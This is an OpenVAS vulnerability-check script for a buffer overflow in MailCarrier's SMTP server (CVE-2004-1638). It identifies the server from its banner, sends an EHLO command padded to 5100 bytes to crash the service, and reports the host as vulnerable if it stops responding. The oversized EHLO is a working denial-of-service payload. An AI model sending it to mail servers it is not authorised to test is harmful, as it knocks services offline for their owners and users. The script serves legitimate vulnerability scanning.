#############################################################################
# OpenVAS Vulnerability Test
# $Id: mailcarrier_smtp_overflow.nasl 6046 2017-04-28 09:02:54Z teissa $
#
# MailCarrier SMTP Buffer Overflow Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>.
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15902");
  script_version("$Revision: 6046 $");
  script_tag(name:"last_modification", value:"$Date: 2017-04-28 11:02:54 +0200 (Fri, 28 Apr 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2004-1638");
  script_bugtraq_id(11535);
  script_xref(name:"OSVDB", value:"11174");
  script_name("MailCarrier SMTP Buffer Overflow Vulnerability");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("SMTP problems");
  script_dependencies("find_service.nasl", "global_settings.nasl", "smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_exclude_keys("SMTP/wrapped");

  script_tag(name:"impact", value:"By sending an overly long EHLO command, a remote attacker can crash the SMTP
  service and execute arbitrary code on the target.");
  script_tag(name:"solution", value:"Upgrade to MailCarrier 3.0.1 or greater.");
  script_tag(name:"summary", value:"The target is running at least one instance of MailCarrier in which the
  SMTP service suffers from a buffer overflow vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("global_settings.inc");
include("smtp_func.inc");

host = get_host_name();

port = get_smtp_port( default:25 );

if( debug_level ) display( "debug: searching for SMTP Buffer Overflow vulnerability in MailCarrier on ", host, ":", port, ".\n" );

banner = get_smtp_banner( port:port );
if( debug_level ) display( "debug: banner =>>", banner, "<<.\n" );
if( "TABS Mail Server" >!< banner ) exit( 0 );

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

# It's MailCarrier and the port's open so try to overflow the buffer.
#
# nb: this just tries to overflow the buffer and crash the service
#     rather than try to run an exploit, like what muts published
#     as a PoC on 10/23/2004. I've verified that buffer sizes of
#     1032 (from the TABS LABS update alert) and 4095 (from 
#     smtp_overflows.nasl) don't crash the service in 2.5.1 while
#     one of 5100 does so that what I use here.
c = string( "EHLO ", crap(5100, "OPENVAS"), "\r\n" );
if( debug_level ) display( "debug: C: ", c );
send( socket:soc, data:c );
repeat {
  s = recv_line( socket:soc, length:32768 );
  if( debug_level ) display( "debug: S: ", s );
}
until (s !~ '^[0-9][0-9][0-9]-');
if( ! s ) {
  close( soc );
  if( debug_level ) display( "debug: trying to reopen socket.\n" );
  soc = open_sock_tcp( port );
  if ( ! soc ) {
    security_message( port:port );
    exit( 0 );
  }
}
send( socket:soc, data:'QUIT\r\n' );
s = recv_line( socket:soc, length:32768 );
close( soc );

exit( 99 );